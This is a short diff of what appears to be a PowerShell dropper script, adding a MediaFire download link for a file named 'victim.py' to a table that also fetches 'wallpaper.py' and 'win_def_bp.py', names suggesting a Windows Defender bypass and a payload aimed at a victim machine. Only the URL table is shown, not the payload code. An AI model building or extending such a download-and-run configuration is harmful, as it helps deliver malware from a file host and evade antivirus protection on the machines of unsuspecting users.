@@ -21,7 +21,7 @@ $downloadUrls = @{
     "mrrobot2.png" = "https://www.mediafire.com/view/0t8p6f5xomo9bww/mrrobot2.png/file"
     "wallpaper.py" = "https://download1326.mediafire.com/p4mdx5s9a9tgUyEch7d-0Qj_uwd7umRa7JnnjWBnLVcD6dfRipR_1PiF9pqRQGFibjzEv0_RLDhCzA7JglQ8qcXOAyr0TjWRMRIEzLPte_SSFK95R0wlIpD_fKbjLXJJWnPoxgTJdcTS5EpNRCUh4XQSCiajVbEiKCKrFdJoanIgavAk/rz6gngk56fl4o1k/wallpaper.py"
     "win_def_bp.py" = "https://www.mediafire.com/file/w7d0u2mjb6jpx93/win_def_bp.py/file"
-    "victim.py" = ""
+    "victim.py" = "https://download851.mediafire.com/fg9dadb9crzg_gqTf72m6bMbRyijhTP8pjCh0vbfPUqC0gIBrz7TfDs2q4xkb5TvUNbAnFDN1RGwRpvj6UFtgBQbJWYJVT8eAotxPl8BohtQLtcDZ66KgKyu3BaQ4NGHm7UA6tOfMyVOB2bvhZrZObSAvccjOqd75UWgMP8j5WDjwG7M/h377nk69ydhz1dy/victim.py"
 }
 
 # Function to check if Python is installed (ADDED FROM FIRST FILE)
